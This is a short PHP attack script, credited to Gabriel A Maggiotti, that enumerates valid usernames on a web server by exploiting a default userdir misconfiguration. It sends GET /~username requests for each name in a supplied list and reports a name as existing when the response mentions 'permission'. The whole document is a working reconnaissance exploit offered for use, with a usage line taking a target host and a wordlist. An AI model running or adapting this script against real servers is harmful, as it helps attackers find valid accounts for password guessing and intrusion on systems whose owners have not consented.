#!/usr/local/bin/php -q
<?
/*
default misconfiguration which could allow remote users
to determine whether a give username exists on the vulnerable system.

        By Gabriel A Maggiotti
 */


        if( $argc!=4)
        {
        echo "usagge: $argv[0] <host> <userlist> <delay>\n";
        return 1;
        }


$host=$argv[1];
$userlist=$argv[2];


$fd = fopen ($userlist, "r");
while (!feof ($fd)) {
        $user = fgets($fd, 4096);
                         
        $fp = fsockopen ($host, 80 , &$errno, &$errstr, 30);
        fputs ($fp, "GET /~$user HTTP/1.0\r\n\r\n");
        while (!feof ($fp)) {
                $sniff=fgets($fp,1024);
                if(strpos($sniff,"permission")!="") {
                        echo "$user exists!!!\n";
                        break;
                }
        }
        fclose ($fp);
        sleep(3);
}

fclose ($fd);

?>
